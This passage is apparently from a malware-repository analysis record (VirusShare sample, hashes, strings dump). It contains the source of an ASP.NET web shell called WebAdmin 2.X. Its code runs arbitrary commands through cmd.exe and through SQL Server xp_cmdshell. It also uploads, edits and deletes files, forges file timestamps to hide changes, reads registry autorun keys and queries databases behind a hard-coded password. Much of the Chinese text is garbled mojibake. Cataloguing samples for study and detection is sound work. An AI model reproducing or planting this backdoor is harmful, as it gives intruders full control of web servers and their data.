run</span>)</p>\n  <p>CMD.exe's Path: \n    <asp:TextBox ID=\"cmdpath\" runat=\"server\" class=\"TextBox\" Text=\"cmd.exe\"/>      </p>\n  Command:\n  <asp:TextBox ID=\"cmd\" runat=\"server\" Width=\"300\" class=\"TextBox\" />\n  <asp:Button ID=\"Button123\" runat=\"server\" Text=\"Run\" OnClick=\"RunCMD\" class=\"buttom\"/>  \n  <p>\n   <asp:Label ID=\"result\" runat=\"server\" style=\"style2\"/>      </p>\n</form>\n<%\n\tcase \"sqlrootkit\"\n%>\n<form runat=\"server\">\n  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:closewindow();\">Close</a></i></p>\n  <p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>\n  <p>Host:\n    <asp:TextBox ID=\"ip\" runat=\"server\" Width=\"300\" class=\"TextBox\" Text=\"127.0.0.1\"/></p>\n  <p>\n  SQL Name:\n    <asp:TextBox ID=\"SqlName\" runat=\"server\" Width=\"50\" class=\"TextBox\" Text='sa'/>\n  SQL Password:\n  <asp:TextBox ID=\"SqlPass\" runat=\"server\" Width=\"80\" class=\"TextBox\"/>\n  </p>\n  Command:\n  <asp:TextBox ID=\"Sqlcmd\" runat=\"server\" Width=\"300\" class=\"TextBox\"/>\n  <asp:Button ID=\"ButtonSQL\" runat=\"server\" Text=\"Run\" OnClick=\"RunSQLCMD\" class=\"buttom\"/>  \n  <p>\n   <asp:Label ID=\"resultSQL\" runat=\"server\" style=\"style2\"/>      </p>\n</form>\n<%\n\tcase \"del\"\n\t\tdim a as string\n\t\ta=request.QueryString(\"src\")\n\t\tcall existdir(a)\n\t\tcall del(a)  \n\t\tresponse.Write(\"<script>alert(\"\"\u027e\ufffd\ufffd\ufffd\u013c\ufffd \" & replace(a,\"\\\",\"\\\\\") & \" \ufffd\u0279\ufffd\ufffd\ufffd\"\");location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(Getparentdir(a)) &\"'</script>\")\n\tcase \"copy\"\n\t\tcall existdir(request.QueryString(\"src\"))\n\t\tsession(\"cutboard\")=\"\u0002\" & request.QueryString(\"src\")\n\t\tresponse.Write(\"<script>alert('\ufffd\u013c\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\u01b5\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0430\u58ec\ufffd\ufffd\ufffd\ufffd\u013f\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\u0435\ufffd\u0573\ufffd\ufffd\ufffd\ufffd\ufffd\u0263\ufffd');location.href='JavaScript:self.close()';</script>\")\n\tcase \"cut\"\n\t\tcall existdir(request.QueryString(\"src\"))\n\t\tsession(\"cutboard\")=\"\u0001\" & request.QueryString(\"src\")\n\t\tresponse.Write(\"<script>alert('\ufffd\u013c\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\u0435\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0430\u58ec\ufffd\ufffd\ufffd\ufffd\u013f\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\u0435\ufffd\u0573\ufffd\ufffd\ufffd\ufffd\ufffd\u0263\ufffd');location.href='JavaScript:self.close()';</script>\")\n\tcase \"plaster\"\n\t\tdim ow as integer\n\t\tif request.Form(\"OverWrite\")<>\"\" then ow=1\n\t\tif request.Form(\"Cancel\")<>\"\" then ow=2\n\t\tur1=request.QueryString(\"src\")\n\t\tcall existdir(ur1)\n\t\tdim d as string\n\t\td=session(\"cutboard\")\n\t\tif left(d,1)=\"\u0001\" then\n\t\t\tTEMP1=ur1 & path.getfilename(mid(replace(d,\"\u0001\",\"\"),1,len(replace(d,\"\u0001\",\"\"))-1))\n\t\t\tTEMP2=ur1 & replace(path.getfilename(d),\"\u0001\",\"\")\n\t\t\tif right(d,1)=\"\\\" then   \n\t\t\t\tcall xexistdir(TEMP1,ow)\n\t\t\t\tdirectory.move(replace(d,\"\u0001\",\"\"),TEMP1 & \"\\\")  \n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd  \" & replace(replace(d,\"\u0001\",\"\"),\"\\\",\"\\\\\") & \"  \ufffd\ufffd  \" & replace(TEMP1 & \"\\\",\"\\\",\"\\\\\") & \"  \ufffd\u0279\ufffd\ufffd\ufffd');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")\n\t\t\telse\n\t\t\t\tcall xexistdir(TEMP2,ow)\n\t\t\t\tfile.move(replace(d,\"\u0001\",\"\"),TEMP2)\n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd  \" & replace(replace(d,\"\u0001\",\"\"),\"\\\",\"\\\\\") & \"  \ufffd\ufffd  \" & replace(TEMP2,\"\\\",\"\\\\\") & \"  \ufffd\u0279\ufffd\ufffd\ufffd');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")\n\t\t\tend if\n\t\telse\n\t\t\tTEMP1=ur1 & path.getfilename(mid(replace(d,\"\u0002\",\"\"),1,len(replace(d,\"\u0002\",\"\"))-1))\n\t\t\tTEMP2=ur1 & path.getfilename(replace(d,\"\u0002\",\"\"))\n\t\t\tif right(d,1)=\"\\\" then \n\t\t\t\tcall xexistdir(TEMP1,ow)\n\t\t\t\tdirectory.createdirectory(TEMP1)\n\t\t\t\tcall copydir(replace(d,\"\u0002\",\"\"),TEMP1 & \"\\\")\n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd  \" & replace(replace(d,\"\u0002\",\"\"),\"\\\",\"\\\\\") & \"  \ufffd\ufffd  \" & replace(TEMP1 & \"\\\",\"\\\",\"\\\\\") & \"  \ufffd\u0279\ufffd\ufffd\ufffd');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")\n\t\t\telse\n\t\t\t\tcall xexistdir(TEMP2,ow)\n\t\t\t\tfile.copy(replace(d,\"\u0002\",\"\"),TEMP2)\n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd  \" & replace(replace(d,\"\u0002\",\"\"),\"\\\",\"\\\\\") & \"  \ufffd\ufffd  \" & replace(TEMP2,\"\\\",\"\\\\\") & \"  \ufffd\u0279\ufffd\ufffd\ufffd');location.href='\"& request.ServerVariables(\"URL\") & \"?action=goto&src=\"& server.UrlEncode(ur1) &\"'</script>\")\n\t\t\tend if\n\t\tend if\n\tcase \"upfile\"\n\t\tur1=request.QueryString(\"src\")\n%>\n<form name=\"UpFileForm\" enctype=\"multipart/form-data\" method=\"post\" action=\"?src=<%=server.UrlEncode(ur1)%>\" runat=\"server\"  onSubmit=\"return checkname();\">\n \ufffd\u3f6b\ufffd\u03f4\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\u013f\u00bc <span class=\"style3\"><%=ur1%></span><br>\n \u0461\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\u0263\ufffd\n <input name=\"upfile\" type=\"file\" class=\"TextBox\" id=\"UpFile\" runat=\"server\">\n    <input type=\"submit\" id=\"UpFileSubit\" value=\"Upload\" runat=\"server\" onserverclick=\"UpLoad\" class=\"buttom\">\n</form>\n<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\">\ufffd\ufffd\ufffd\ufffd</a>\n<%\n\tcase \"new\"\n\t\tur1=request.QueryString(\"src\")\n%>\n<form runat=\"server\">\n  <%=ur1%><br>\n  \ufffd\ufffd\ufffd\u01a3\ufffd\n  <asp:TextBox ID=\"NewName\" TextMode=\"SingleLine\" runat=\"server\" class=\"TextBox\"/>\n  <br>\n  <asp:RadioButton ID=\"NewFile\" Text=\"File\" runat=\"server\" GroupName=\"New\" Checked=\"true\"/>\n  <asp:RadioButton ID=\"NewDirectory\" Text=\"Directory\" runat=\"server\"  GroupName=\"New\"/> \n  <br>\n  <asp:Button ID=\"NewButton\" Text=\"Submit\" runat=\"server\" CssClass=\"buttom\"  OnClick=\"NewFD\"/>  \n  <input name=\"Src\" type=\"hidden\" value=\"<%=ur1%>\">\n</form>\n<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\">\ufffd\ufffd\ufffd\ufffd</a>\n<%\n\tcase \"edit\"\n\t\tdim b as string\n\t\tb=request.QueryString(\"src\")\n\t\tcall existdir(b)\n\t\tdim myread as new streamreader(b,encoding.default)\n\t\tfilepath.text=b\n\t\tcontent.text=myread.readtoend\n%>\n<form runat=\"server\">\n  <table width=\"80%\"  border=\"1\" align=\"center\">\n    <tr>      <td width=\"11%\">\u00b7\ufffd\ufffd</td>\n      <td width=\"89%\">\n      <asp:TextBox CssClass=\"TextBox\" ID=\"filepath\" runat=\"server\" Width=\"300\"/>\n      *</td>\n    </tr>\n    <tr>\n      <td>\ufffd\ufffd\ufffd\ufffd</td> \n      <td> <asp:TextBox ID=\"content\" Rows=\"25\" Columns=\"100\" TextMode=\"MultiLine\" runat=\"server\" CssClass=\"TextBox\"/></td>\n    </tr>\n    <tr>\n      <td></td>\n      <td> <asp:Button ID=\"a\" Text=\"Sumbit\" runat=\"server\" OnClick=\"Editor\" CssClass=\"buttom\"/>         \n      </td>\n    </tr>\n  </table>\n</form>\n<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\">\ufffd\ufffd\ufffd\ufffd</a>\n<%\n  \t\tmyread.close\n\tcase \"rename\"\n\t\tur1=request.QueryString(\"src\")\n\t\tif request.Form(\"name\")=\"\" then\n\t%>\n<form name=\"formRn\" method=\"post\" action=\"?action=rename&src=<%=server.UrlEncode(request.QueryString(\"src\"))%>\" onSubmit=\"return checkname();\">\n  <p>\ufffd\u3f6b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd <span class=\"style3\"><%=request.QueryString(\"src\")%></span> \u03aa\ufffd\ufffd <%=getparentdir(request.QueryString(\"src\"))%>\n    <input type=\"text\" name=\"name\" class=\"TextBox\">\n    <input type=\"submit\" name=\"Submit3\" value=\"Submit\" class=\"buttom\">\n</p>\n</form>\n<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\">\ufffd\ufffd\ufffd\ufffd</a>\n<script language=\"javascript\">\nfunction checkname()\n{\nif(formRn.name.value==\"\"){alert(\"\ufffd\ufffd\u04e6\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd :(\");return false}\n}\n</script>\n  <%\n\t\telse\n\t\t\tif Rename() then\n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \" & replace(ur1,\"\\\",\"\\\\\") & \" \u03aa \" & replace(Getparentdir(ur1) & request.Form(\"name\"),\"\\\",\"\\\\\") & \" \ufffd\u0279\ufffd\ufffd\ufffd\ufffd\ufffd\u02e2\ufffd\ufffd\u05ae\ufffd\ufffd');location.href='JavaScript:self.close()';</script>\")\n\t\t\telse\n\t\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd\u036c\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02a7\ufffd\ufffd :(');location.href='JavaScript:self.close()';</script>\")\n\t\t\tend if\n\t\tend if\n\tcase \"samename\"\n\t\tur1=request.QueryString(\"src\")\n%>\n<form name=\"form1\" method=\"post\" action=\"?action=plaster&src=<%=server.UrlEncode(ur1)%>\">\n<p class=\"style3\">\ufffd\ufffd\ufffd\ufffd\u036c\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u01f7\ud9a3\udcb8\u01e3\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0461NO\ufffd\ufffd\ufffd\u04bd\ufffd\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01f0\u05fa\ufffd\ufffd</p>\n  <input name=\"OverWrite\" type=\"submit\" id=\"OverWrite\" value=\"Yes\" class=\"buttom\">\n<input name=\"Cancel\" type=\"submit\" id=\"Cancel\" value=\"No\" class=\"buttom\">\n</form>\n<a href=\"javascript:history.back(1);\" style=\"color:#FF0000\">\ufffd\ufffd\ufffd\ufffd</a>\n   <%\n    case \"clonetime\"\n\t\ttime1.Text=request.QueryString(\"src\")&\"webadmin2X.aspx\"\n\t\ttime2.Text=request.QueryString(\"src\")\n\t%>\n<form runat=\"server\">\n  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\ufffd\u0631\ufffd</a></i> </p>\n  <p>A tool that it copy the file or directory's time to another file or directory </p>\n  <p>Rework File or Dir:\n    <asp:TextBox CssClass=\"TextBox\" ID=\"time1\" runat=\"server\" Width=\"300\"/></p>\n  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n    <asp:TextBox CssClass=\"TextBox\" ID=\"time2\" runat=\"server\" Width=\"300\"/></p>\n<asp:Button ID=\"ButtonClone\" Text=\"Submit\" runat=\"server\" CssClass=\"buttom\" OnClick=\"CloneTime\"/>\n</form>\n<p>\n  <%\n    case \"reg\"\n  %>\n<form runat=\"server\">\n  <p>[Read Reg for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\ufffd\u0631\ufffd</a></i> </p>\n  <p>A tool that it can read regedit </p>\n Key : <asp:TextBox ID=\"Reg1\" runat=\"server\" Width=\"500\" CssClass=\"TextBox\" Text=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"/>  \n<br>\n  Value: \n  <asp:TextBox ID=\"Reg2\" runat=\"server\" CssClass=\"TextBox\" Text=\"KAVRun\"/>  \n<asp:Button ID=\"RegButtom\" runat=\"server\" Text=\"Sumbit\" OnClick=\"ReadReg\" CssClass=\"buttom\"/>  \n</form>\n<asp:Label ID=\"Label1\" runat=\"server\" />\n  <%\n  \tcase \"data\"\n  %>\n<form runat=\"server\">\n  <p>[Control DataBase for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:closewindow();\">\ufffd\u0631\ufffd</a></i> </p>\n  <p>A tool that it can Control Database </p>\n<p><asp:Button Text=\"ReLoad\" OnClick=\"DB_ReLoad\" runat=\"server\" CssClass=\"buttom\"></asp:Button></p>\n  <p>Connection String : \n    <asp:TextBox ID=\"DB_CString\" Width=\"500\" runat=\"server\" CssClass=\"TextBox\"/>      </p>\n  <p>Select Database:\n  <asp:RadioButton ID=\"DB_rB_MSSQL\" Text=\"MSSQL\" GroupName=\"DBSelecting\" OnCheckedChanged=\"DB_onrB_1\" AutoPostBack=\"true\" runat=\"server\" CssClass=\"buttom\"/>\n  <asp:RadioButton ID=\"DB_rB_Access\" Text=\"Access\" GroupName=\"DBSelecting\" OnCheckedChanged=\"DB_onrB_2\" AutoPostBack=\"true\" runat=\"server\" CssClass=\"buttom\"/>   \n  <asp:Button ID=\"DB_sButton\" runat=\"server\" Text=\"Submit\" OnClick=\"DB_onsB\" CssClass=\"buttom\"/>  \n  </p> \n  <p><asp:Label ID=\"db_Label\" runat=\"server\"></asp:Label></p>\n    <p>\n\t<asp:Label ID=\"DB_exe\" Text=\"Execute SQL ( No echo ): \" Visible=\"false\" runat=\"server\"/>\n    <asp:TextBox ID=\"DB_EString\" Width=\"500\" runat=\"server\" Visible=\"false\" CssClass=\"TextBox\"/>\n\t<asp:Button ID=\"DB_eButton\" runat=\"server\" Text=\"Submit\" Visible=\"false\" OnClick=\"DB_oneB\" CssClass=\"buttom\"/>\n\t</p>\n  <p>\n  <asp:DataGrid ID=\"DB_DataGrid\" with=\"100%\" AllowPaging=\"true\" AllowSorting=\"true\" OnSortCommand=\"DB_Sort\" PageSize=\"10\" OnPageIndexChanged=\"DB_Page\" PagerStyle-Mode=\"NumericPages\" runat=\"server\"></asp:DataGrid>\n  </p>\n</form>\n  <%\n\tcase \"logout\"\n   \t\tsession.Abandon()\n\t\tresponse.Write(\"<script>alert(' \ufffd\ufffd\ufffd\ufffd\u0176\ufffd\ufffd');location.href='\" & request.ServerVariables(\"URL\") & \"';</sc\" & \"ript>\")\n\tend select\nend if\nCatch error_x\n\tresponse.Write(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd</font>\"&error_x.Message)\nEnd Try\n%>\n</p>\n</p>\n<hr noshade>\n<script language=\"javascript\">\nfunction closewindow()\n{self.close();}\n</script>\n<p align=\"center\">WebAdmin2.X By <a href=\"http://lake2.0x54.org\" title=\"Welcome to my page:)\" target=\"_blank\"><em>lake2</em></a> from China [<a href=\"http://blog.csdn.net/lake2/archive/2005/01/27/270921.aspx\" target=\"_blank\">\ufffd\ufffd\ufffd\ufffd</a>]</p>\n</body>\n</html>"
    },
    "filename": "VirusShare_3ac3447701dcc2b7a09b2440dad92781",
    "filesize": 32467,
    "filetype": "data",
    "hashes": {
        "md5": "3ac3447701dcc2b7a09b2440dad92781",
        "sha1": "5778f067dfcb254806ebe42ded44252bba84d6ac",
        "sha256": "3e6b8618f50f0be775767634b15d68d7625fb913e4790c7d81669277be09b449"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<%@ Page Language=\"VB\" ContentType=\"text/html\"  validateRequest=\"false\" aspcompat=\"true\"%>",
            "<%@ Import Namespace=\"System.IO\" %>",
            "<%@ import namespace=\"System.Diagnostics\" %>",
            "<%@ Import Namespace=\"Microsoft.Win32\" %>",
            "<%@ Import Namespace=\"System.Data\" %>",
            "<%@ Import Namespace=\"System.Data.OleDb\" %>",
            "<script runat=\"server\">",
            "Dim PASSWORD as string = \"xiaoqi\"   'xiaoqi  \u053c\u0130  ",
            "'----------------------------------------------------------------------",
            "'-----------------           WebAdmin by lake2        -----------------",
            "'-----------------       E-mail: lakl2@mail.csdn.net  -----------------",
            "'-----------------           http://lake2.0x54.com    -----------------",
            "'-----------------              Version 2.X           -----------------",
            "'-----------------            Build (20050719)        -----------------",
            "'----------------------------------------------------------------------",
            "'  Description:",
            "'    1. This program run on ASP.NET environment,control the web",
            "'    2. It looks like backdoor , but I wish you like it .",
            "'    3. If you have some words to me , please send me a Email",
            "'------------",
            "dim ur1,TEMP1,TEMP2,TITLE,SORTFILED as string",
            "Sub Login_click(sender As Object, E As EventArgs)",
            "\tif Textbox.Text=PASSWORD then     ",
            "\t\tsession(\"lake2\")=1",
            "\t\tsession.Timeout=45",
            "\telse",
            "\t\tresponse.Write(\"<font color='red'></font><br>\")",
            "\tend if",
            "End Sub",
            "Sub RunCMD(Src As Object, E As EventArgs)",
            "\tDim myProcess As New Process()",
            "\tDim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)",
            "\tmyProcessStartInfo.UseShellExecute = False",
            "\tmyProcessStartInfo.RedirectStandardOutput = true",
            "\tmyProcess.StartInfo = myProcessStartInfo",
            "\tmyProcessStartInfo.Arguments=\"/c \" & Cmd.texT",
            "\tmyProcess.Start()",
            "\tDim myStreamReader As StreamReader = myProcess.StandardOutput",
            "\tDim myString As String = myStreamReader.Readtoend()",
            "\tmyProcess.Close()",
            "\tmystring=replace(mystring,\">\",\"&lt;\")",
            "\tmystring=replace(mystring,\"<\",\"&gt;\")",
            "\tresult.text=Cmd.text & vbcrlf & \"<pre>\" & mystring & \"</pre>\"",
            "\tCmd.text=\"\"",
            "End Sub",
            "Sub CloneTime(Src As Object, E As EventArgs)",
            "\texistdir(time1.Text)",
            "\texistdir(time2.Text)",
            "\tDim thisfile As FileInfo =New FileInfo(time1.Text)",
            "\tDim thatfile As FileInfo =New FileInfo(time2.Text)",
            "\tthisfile.LastWriteTime = thatfile.LastWriteTime",
            "\tthisfile.LastAccessTime = thatfile.LastAccessTime",
            "\tthisfile.CreationTime = thatfile.CreationTime",
            "\tresponse.Write(\"<font color=\"\"red\"\">Clone Time \u0279!</font>\")",
            "End Sub",
            "Sub ReadReg(Src As Object, E As EventArgs)",
            "\tDim error_x as Exception",
            "\tDim hu As String = Reg1.Text",
            "\tDim rk As RegistryKey",
            "\tSelect Mid( hu ,1 , Instr( hu,\"\\\" )-1 )",
            "\t\tcase \"HKEY_LOCAL_MACHINE\"",
            "\t\t\trk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )",
            "\t\tcase \"HKEY_CLASSES_ROOT\"",
            "\t\t\trk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )",
            "\t\tcase \"HKEY_CURRENT_USER\"",
            "\t\t\trk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )",
            "\t\tcase \"HKEY_USERS\"",
            "\t\t\trk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )",
            "\t\tcase \"HKEY_CURRENT_CONFIG\"",
            "\t\t\trk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )",
            "\tEnd Select",
            "\tLabel1.Text = rk.GetValue(Reg2.Text , \"NULL\")",
            "\trk.Close()",
            "Catch error_x",
            "\tLabel1.Text = \"\u0434\u01f2\u06b8",
            "End Try",
            "End Sub",
            "sub Editor(Src As Object, E As EventArgs)",
            "\tdim mywrite as new streamwriter(filepath.text,false,encoding.default)",
            "\tmywrite.write(content.text)",
            "\tmywrite.close",
            "\tresponse.Write(\"<script>alert('\u0f2d|\u013c \" & replace(filepath.text,\"\\\",\"\\\\\") & \" \u0279\u02e2\u05ae')</sc\"&\"ript>\")",
            "end sub",
            "Sub UpLoad(Src As Object, E As EventArgs)",
            "\tdim filename,loadpath as string",
            "\tfilename=path.getfilename(UpFile.value)",
            "\tloadpath=request.QueryString(\"src\") & filename",
            "\tif  file.exists(loadpath)=true then ",
            "\t\tresponse.Write(\"<script>alert('\u013c\" & replace(loadpath,\"\\\",\"\\\\\") & \" \u047e\u06a3\u03f4\u02a7\u0723')</sc\"&\"ript>\")",
            "\t\tresponse.End()",
            "\tend if",
            "\tUpFile.postedfile.saveas(loadpath)",
            "\tresponse.Write(\"<script>alert('\u013c \" & replace(filename,\"\\\",\"\\\\\") & \" \u03f4\u0279\\n\u013c\u03e2",
            "\\n\\n",
            "\" & replace(UpFile.value,\"\\\",\"\\\\\") & \"\\n\u013c\u0421\" & UpFile.postedfile.contentlength & \" bytes\\n\u0536",
            "\" & replace(loadpath,\"\\\",\"\\\\\") & \"\\n');</scri\"&\"pt>\")",
            "End Sub",
            "Sub NewFD(Src As Object, E As EventArgs)",
            "\tur1=request.form(\"src\")",
            "\tif NewFile.Checked = True then",
            "\t\tdim mywrite as new streamwriter(ur1 & NewName.Text,false,encoding.default)",
            "\t\tmywrite.close",
            "\t\tresponse.Redirect(request.ServerVariables(\"URL\") & \"?action=edit&src=\" & server.UrlEncode(ur1 & NewName.Text))",
            "\telse",
            "\t\tdirectory.createdirectory(ur1 & NewName.Text)",
            "\t\tresponse.Write(\"<script>alert('\u013c \" & replace(ur1 & NewName.Text ,\"\\\",\"\\\\\") & \" \u0279\u02e2\u05ae');</sc\" & \"ript>\")",
            "\tend if",
            "End Sub",
            "Sub del(a)",
            "\tif right(a,1)=\"\\\" then",
            "\t\tdim xdir as directoryinfo",
            "\t\tdim mydir as new DirectoryInfo(a)",
            "\t\tdim xfile as fileinfo",
            "\t\tfor each xfile in mydir.getfiles()",
            "\t\t\tfile.delete(a & xfile.name)",
            "\t\tnext",
            "\t\tfor each xdir in mydir.getdirectories()",
            "\t\t\tcall del(a & xdir.name & \"\\\")",
            "\t\tnext",
            "\t\tdirectory.delete(a)",
            "\telse",
            "\t\tfile.delete(a)",
            "\tend if",
            "End Sub",
            "Sub copydir(a,b)",
            "\tdim xdir as directoryinfo",
            "\tdim mydir as new DirectoryInfo(a)",
            "\tdim xfile as fileinfo",
            "\tfor each xfile in mydir.getfiles()",
            "\t\tfile.copy(a & \"\\\" & xfile.name,b & xfile.name)",
            "\tnext",
            "\tfor each xdir in mydir.getdirectories()",
            "\t\tdirectory.createdirectory(b & path.getfilename(a & xdir.name))",
            "\t\tcall copydir(a & xdir.name & \"\\\",b & xdir.name & \"\\\")",
            "\tnext",
            "End Sub",
            "Sub xexistdir(temp,ow)",
            "\tif directory.exists(temp)=true or file.exists(temp)=true then ",
            "\t\tif ow=0  then",
            "\t\t\tresponse.Redirect(request.ServerVariables(\"URL\") & \"?action=samename&src=\" & server.UrlEncode(ur1))",
            "\t\telseif ow=1 then",
            "\t\t\tdel(temp)",
            "\t\telse",
            "\t\t\tdim d as string = session(\"cutboard\")",
            "\t\t\tif right(d,1)=\"\\\" then",
            "\t\t\t\tTEMP1=ur1 & second(now) & path.getfilename(mid(replace(d,\"",
            "\",\"\"),1,len(replace(d,\"",
            "\",\"\"))-1))",
            "\t\t\telse",
            "\t\t\t\tTEMP2=ur1 & second(now) & replace(path.getfilename(d),\"",
            "\",\"\")",
            "\t\t\tend if",
            "\t\tend if",
            "\tend if",
            "End Sub",
            "Sub existdir(temp)",
            "\t\tif  file.exists(temp)=false and directory.exists(temp)=false then ",
            "\t\t\tresponse.Write(\"<script>alert('",
            " \" & replace(temp,\"\\\",\"\\\\\")  &\"');</sc\" & \"ript>\")",
            "\t\t\tresponse.Write(\"<br><br><a href='javascript:history.back(1);'></a>\")",
            "\t\t\tresponse.End()",
            "\t\tend if",
            "End Sub",
            "Sub RunSQLCMD(Src As Object, E As EventArgs)",
            "\tDim adoConn,strQuery,recResult,strResult",
            "\tif SqlName.Text<>\"\" then",
            "\t\tadoConn=Server.CreateObject(\"ADODB.Connection\") ",
            "\t\tadoConn.Open(\"Provider=SQLOLEDB.1;Password=\" & SqlPass.Text & \";UID=\" & SqlName.Text & \";Data Source = \" & ip.Text) ",
            "\t\tIf Sqlcmd.Text<>\"\" Then ",
            "\t\t\tstrQuery = \"exec master.dbo.xp_cmdshell '\" & Sqlcmd.Text & \"'\" ",
            "\t  \t\trecResult = adoConn.Execute(strQuery) ",
            " \t \t\tIf NOT recResult.EOF Then ",
            "   \t\t\t\tDo While NOT recResult.EOF ",
            "    \t\t\t\tstrResult = strResult & chr(13) & recResult(0).value",
            "    \t\t\t\trecResult.MoveNext ",
            "   \t\t\t\tLoop ",
            " \t \t\tEnd if ",
            "  \t\t\trecResult = Nothing ",
            "  \t\t\tstrResult = Replace(strResult,\" \",\"&nbsp;\") ",
            "  \t\t\tstrResult = Replace(strResult,\"<\",\"&lt;\") ",
            "  \t\t\tstrResult = Replace(strResult,\">\",\"&gt;\") ",
            "\t\t\tresultSQL.Text=SqlCMD.Text & vbcrlf & \"<pre>\" & strResult & \"</pre>\"",
            "\t\t\tSqlCMD.Text=\"\"",
            "\t\t End if ",
            "  \t\tadoConn.Close ",
            "\t End if",
            " End Sub",
            "Function GetStartedTime(ms) ",
            "\tGetStartedTime=cint(ms/(1000*60*60))",
            "End function",
            "Function getIP() ",
            "    Dim strIPAddr as string",
            "    If Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\") = \"\" OR InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \"unknown\") > 0 Then",
            "        strIPAddr = Request.ServerVariables(\"REMOTE_ADDR\")",
            "    ElseIf InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \",\") > 0 Then",
            "        strIPAddr = Mid(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), 1, InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \",\")-1)",
            "    ElseIf InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \";\") > 0 Then",
            "        strIPAddr = Mid(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), 1, InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \";\")-1)",
            "    Else",
            "        strIPAddr = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")",
            "    End If",
            "    getIP = Trim(Mid(strIPAddr, 1, 30))",
            "End Function",
            "Function Getparentdir(nowdir)",
            "\tdim temp,k as integer",
            "\ttemp=1",
            "\tk=0",
            "\tif len(nowdir)>4 then ",
            "\t\tnowdir=left(nowdir,len(nowdir)-1) ",
            "\tend if",
            "\tdo while temp<>0",
            "\t\tk=temp+1",
            "\t\ttemp=instr(temp,nowdir,\"\\\")",
            "\t\tif temp =0 then",
            "\t\t\texit do",
            "\t\tend if",
            "\t\ttemp = temp+1",
            "\tloop",
            "\tif k<>2 then",
            "\t\tgetparentdir=mid(nowdir,1,k-2)",
            "\telse",
            "\t\tgetparentdir=nowdir",
            "\tend if",
            "End function",
            "Function Rename()",
            "\tur1=request.QueryString(\"src\")",
            "\tif file.exists(Getparentdir(ur1) & request.Form(\"name\")) then",
            "\t\trename=0   ",
            "\telse",
            "\t\tfile.copy(ur1,Getparentdir(ur1) & request.Form(\"name\"))",
            "\t\tdel(ur1)",
            "\t\trename=1",
            "\tend if",
            "End Function ",
            "Function GetSize(temp)",
            "\tif temp < 1024 then",
            "\t\tGetSize=temp & \" bytes\"",
            "\telse",
            "\t\tif temp\\1024 < 1024 then",
            "\t\t\tGetSize=temp\\1024 & \" KB\"",
            "\t\telse",
            "\t\t\tif temp\\1024\\1024 < 1024 then",
            "\t\t\t\tGetSize=temp\\1024\\1024 & \" MB\"",
            "\t\t\telse",
